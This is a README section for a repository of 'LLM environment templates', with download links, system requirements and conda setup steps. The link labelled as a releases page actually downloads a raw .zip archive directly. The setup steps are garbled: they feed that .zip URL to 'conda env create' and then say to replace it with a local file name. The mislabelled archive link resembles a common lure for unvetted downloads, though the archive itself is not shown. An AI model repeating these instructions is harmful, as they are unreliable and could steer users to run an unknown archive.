## 📥 Download & Install

To download and set up the environments, please visit the release page:

[Download from Releases](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip)

Follow these steps:

1. Click the link to open the releases page.
2. You will see various downloadable environment templates.
3. Select the template that fits your needs. 
4. Click on the template file to start downloading.
5. Once the download finishes, locate the file on your computer.

## 🔧 System Requirements

To use these templates, ensure your computer meets the following requirements:

- **Operating System:** Windows, macOS, or Linux.
- **Python Version:** Must have Python 3.8 or higher installed.
- **Conda:** Install the latest version of Conda for managing environments.
- **Flash Attention:** Optional, but recommended for better performance in LLM.
- **Memory:** At least 8GB of RAM to manage the environments effectively.

## 📁 How to Use the Templates

Once you have downloaded the template, follow these steps to set up your environment:

1. **Open a Terminal:**
   - On Windows, use Command Prompt or Anaconda Prompt.
   - On macOS or Linux, use the Terminal application.

2. **Navigate to the Download Location:**
   - Use the `cd` command to go to the folder where you downloaded the template. 
   - For example:
     ```
     cd path/to/your/download/folder
     ```

3. **Create a New Environment:**
   - Run the following command:
     ```
     conda env create -f https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip
     ```
   - Replace `https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip` with the name of the template file you downloaded.

4. **Activate the Environment:**
   - Use this command to activate your new environment:
     ```
     conda activate your_environment_name
     ```
   - Replace `your_environment_name` with the name specified in the template.

5. **Install Additional Packages (if needed):**
   - If your development project requires extra packages not included in the template, you can install them with:
     ```
     pip install package_name
     ```
